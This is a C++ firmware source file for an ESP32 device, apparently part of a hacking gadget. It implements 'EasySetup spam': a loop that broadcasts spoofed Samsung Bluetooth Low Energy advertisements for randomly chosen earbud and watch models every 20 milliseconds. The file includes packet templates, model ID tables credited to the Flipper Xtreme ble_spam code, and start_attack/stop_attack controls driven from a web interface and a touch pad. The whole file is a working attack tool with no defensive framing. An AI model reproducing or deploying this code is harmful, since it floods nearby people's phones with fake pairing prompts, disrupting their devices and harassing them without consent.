#include "BLEDevice.h"

#include "ble/BLEEasySetupSpamApp.h"
#include "DisplayManager.h"

#define TAG "EasySetupSpam"

TaskHandle_t easySetupSpamTaskHandle = NULL;
BLEEasySetupSpamAppState easySetupSpamState = BLE_EASYSETUP_SPAM_STATE_HOME;

uint8_t easySetupBudsAdv[28] = {
  27, 0xFF, 0x75, 0x00,
  0x42, 0x09, 0x81, 0x02,
  0x14, 0x15, 0x03, 0x21,
  0x01, 0x09, 0xFF, 0xFF, // 14 model byte0, 15 byte1
  0x01, 0xFF, 0x06, 0x3C, // 0x01, 17 model byte2, 0x06, 0x3C
  0x94, 0x8E, 0x00, 0x00,
  0x00, 0x00, 0xC7, 0x00
};

uint8_t easySetupBudsScanRsp[17] = {
  16, 0xFF, 0x75, 0x00,
  0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00
};

uint8_t easySetupWatchAdv[15] = {
  14, 0xFF, 0x75, 0x00,
  0x01, 0x00, 0x02, 0x00,
  0x01, 0x01, 0xFF, 0x00,
  0x00, 0x43, 0xFF // LAST BYTE (14) IS WATCH MODEL
};

// https://github.com/Flipper-XFW/Xtreme-Apps/blob/dev/ble_spam/protocols/easysetup.c
static const struct {
  uint32_t value;
  const char* name;
} buds_models[] = {
  {0xEE7A0C, "Fallback Buds"},
  {0x9D1700, "Fallback Dots"},
  {0x39EA48, "Light Purple Buds2"},
  {0xA7C62C, "Bluish Silver Buds2"},
  {0x850116, "Black Buds Live"},
  {0x3D8F41, "Gray & Black Buds2"},
  {0x3B6D02, "Bluish Chrome Buds2"},
  {0xAE063C, "Gray Beige Buds2"},
  {0xB8B905, "Pure White Buds"},
  {0xEAAA17, "Pure White Buds2"},
  {0xD30704, "Black Buds"},
  {0x9DB006, "French Flag Buds"},
  {0x101F1A, "Dark Purple Buds Live"},
  {0x859608, "Dark Blue Buds"},
  {0x8E4503, "Pink Buds"},
  {0x2C6740, "White & Black Buds2"},
  {0x3F6718, "Bronze Buds Live"},
  {0x42C519, "Red Buds Live"},
  {0xAE073A, "Black & White Buds2"},
  {0x011716, "Sleek Black Buds2"},
};
static const uint8_t buds_models_count = sizeof(buds_models) / sizeof(buds_models[0]);

static const struct {
  uint8_t value;
  const char* name;
} watch_models[] = {
  {0x1A, "Fallback Watch"},
  {0x01, "White Watch4 Classic 44m"},
  {0x02, "Black Watch4 Classic 40m"},
  {0x03, "White Watch4 Classic 40m"},
  {0x04, "Black Watch4 44mm"},
  {0x05, "Silver Watch4 44mm"},
  {0x06, "Green Watch4 44mm"},
  {0x07, "Black Watch4 40mm"},
  {0x08, "White Watch4 40mm"},
  {0x09, "Gold Watch4 40mm"},
  {0x0A, "French Watch4"},
  {0x0B, "French Watch4 Classic"},
  {0x0C, "Fox Watch5 44mm"},
  {0x11, "Black Watch5 44mm"},
  {0x12, "Sapphire Watch5 44mm"},
  {0x13, "Purpleish Watch5 40mm"},
  {0x14, "Gold Watch5 40mm"},
  {0x15, "Black Watch5 Pro 45mm"},
  {0x16, "Gray Watch5 Pro 45mm"},
  {0x17, "White Watch5 44mm"},
  {0x18, "White & Black Watch5"},
  {0xE4, "Black Watch5 Golf Edition"},
  {0xE5, "White Watch5 Gold Edition"},
  {0x1B, "Black Watch6 Pink 40mm"},
  {0x1C, "Gold Watch6 Gold 40mm"},
  {0x1D, "Silver Watch6 Cyan 44mm"},
  {0x1E, "Black Watch6 Classic 43m"},
  {0x20, "Green Watch6 Classic 43m"},
  {0xEC, "Black Watch6 Golf Edition"},
  {0xEF, "Black Watch6 TB Edition"},
};
static const uint8_t watch_models_count = sizeof(watch_models) / sizeof(watch_models[0]);

static esp_ble_adv_params_t easysetup_adv_params = {
  .adv_int_min        = 0x20,
  .adv_int_max        = 0x20,
  .adv_type           = ADV_TYPE_IND,
  .own_addr_type      = BLE_ADDR_TYPE_PUBLIC,
  //.peer_addr            =
  //.peer_addr_type       =
  .channel_map        = ADV_CHNL_ALL,
  .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

void BLEEasySetupSpamApp::sendState(int state) {
  JsonDocument doc;
  String res;

  doc["app"] = APP_ID_BLE_EASYSETUP_SPAM;
  doc["state"] = state;
  serializeJson(doc, res);
  WebServerModule::notifyClients(res);
};

void BLEEasySetupSpamApp::stop_attack() {
  easySetupSpamState = BLE_EASYSETUP_SPAM_STATE_HOME;
  BLEEasySetupSpamApp::sendState((int)easySetupSpamState);

  leds->blink(255, 0, 0, 2);

  if (easySetupSpamTaskHandle != NULL) {
    vTaskDelete(easySetupSpamTaskHandle);
    easySetupSpamTaskHandle = NULL;
  }

  BLEDevice::deinit();
};

void BLEEasySetupSpamApp::start_attack() {
  esp_err_t ret = xTaskCreate(&BLEEasySetupSpamApp::_task, "esspam", 16000, NULL, 1, &easySetupSpamTaskHandle);
  if (ret == ESP_FAIL) {
    ESP_LOGE(TAG, "esspam task err: %s", esp_err_to_name(ret));
  }
  easySetupSpamState = BLE_EASYSETUP_SPAM_STATE_RUNNING;
  BLEEasySetupSpamApp::sendState((int)easySetupSpamState);
};

void BLEEasySetupSpamApp::_task(void *taskParams) {
  BLEDevice::init("");

  srand((unsigned int)esp_timer_get_time());

  while (1) {
    int maxAdvSize = sizeof(easySetupBudsAdv) > sizeof(easySetupWatchAdv) ? sizeof(easySetupBudsAdv) : sizeof(easySetupWatchAdv);
    uint8_t advPkt[maxAdvSize];
    int advSize;

    int choice =  rand() % 2;

    if (choice == 1) {
      // Buds
      const typeof(buds_models[0]) *model = &buds_models[rand() % buds_models_count];
      advSize = sizeof(easySetupBudsAdv);

      uint8_t byte0 = (model->value >> 0x10) & 0xFF;
      uint8_t byte1 = (model->value >> 0x08) & 0xFF;
      uint8_t byte2 = (model->value >> 0x00) & 0xFF;

      memcpy(advPkt, easySetupBudsAdv, advSize);
      memcpy(&advPkt[14], &byte0, 1);
      memcpy(&advPkt[15], &byte1, 1);
      memcpy(&advPkt[17], &byte2, 1);

      esp_err_t ret = esp_ble_gap_config_adv_data_raw(advPkt, advSize);

      if (ret != ESP_OK) {
        ESP_LOGE(TAG, "budpkt err: %s", esp_err_to_name(ret));
      }

      ret = esp_ble_gap_config_scan_rsp_data_raw(easySetupBudsScanRsp, sizeof(easySetupBudsScanRsp));

      if (ret != ESP_OK) {
        ESP_LOGE(TAG, "scanrsp err: %s", esp_err_to_name(ret));
      }
    } else {
      // Watch
      const typeof(watch_models[0]) *model = &watch_models[rand() % watch_models_count];
      advSize = sizeof(easySetupWatchAdv);

      uint8_t byte0 = (model->value >> 0x00) & 0xFF;

      memcpy(advPkt, easySetupWatchAdv, advSize);
      memcpy(&advPkt[14], &byte0, 1);

      esp_ble_gap_config_adv_data_raw(advPkt, advSize);
      esp_ble_gap_config_scan_rsp_data_raw(NULL, 0);
    }

    esp_ble_gap_start_advertising(&easysetup_adv_params);

    vTaskDelay(20 / portTICK_PERIOD_MS);
  }
};

void BLEEasySetupSpamApp::webEvent(BLEEasySetupSpamWebEventParams *ps) {
  ESP_LOGI(TAG, "Web: %s", ps->action);
  JsonDocument doc;
  String res;

  if (strcmp(ps->action, "status") == 0) {
    doc["app"] = APP_ID_BLE_EASYSETUP_SPAM;
    doc["state"] = (int)easySetupSpamState;
    serializeJson(doc, res);
    return WebServerModule::notifyClients(res);
  }

  if (strcmp(ps->action, "start") == 0) {
    DisplayManager::appRunning = true;
    leds->stop_animations();
    bleApp = BLE_APP_EASYSETUP_SPAM;
    DisplayManager::setMenu(BLE_MENU);
    BLEEasySetupSpamApp::start_attack();
  }

  if (strcmp(ps->action, "stop") == 0) {
    BLEEasySetupSpamApp::stop_attack();
    DisplayManager::appRunning = false;
    bleApp = BLE_APP_NONE;
    DisplayManager::setMenu(MAIN_MENU);
    vTaskDelay(2000 / portTICK_PERIOD_MS);
  }
};

void BLEEasySetupSpamApp::ontouch(int pad, const char* type, uint32_t value) {
  switch (pad) {
    case LEFT: {
      break;
    }
    case RIGHT: {
      break;
    }
    case MIDDLE: {
      if (strcmp(type, "longPress") == 0) {
        switch (easySetupSpamState) {
          case BLE_EASYSETUP_SPAM_STATE_HOME: {
            bleApp = BLE_APP_NONE;
            DisplayManager::appRunning = false;
            return;
          }
          case BLE_EASYSETUP_SPAM_STATE_RUNNING: {
            stop_attack();
            return;
          }
          default:
            break;
        }
      }

      switch (easySetupSpamState) {
        case BLE_EASYSETUP_SPAM_STATE_HOME: {
          start_attack();
          break;
        }
        default:
          break;
      }

      break;
    }
  }
};

void BLEEasySetupSpamApp::render() {
  switch (easySetupSpamState) {
    case BLE_EASYSETUP_SPAM_STATE_HOME: {
      display->centeredText("easysetup spam", 0);
      display->text("", 1);
      display->centeredText("start", 2);
      display->text("", 3);
      break;
    }
    case BLE_EASYSETUP_SPAM_STATE_RUNNING: {
      display->centeredText("easysetup spam", 0);
      display->text("", 1);
      display->centeredText("running", 2);
      display->centeredText("", 3);
      break;
    }
    default:
      break;
  }

  vTaskDelay(20 / portTICK_PERIOD_MS);
};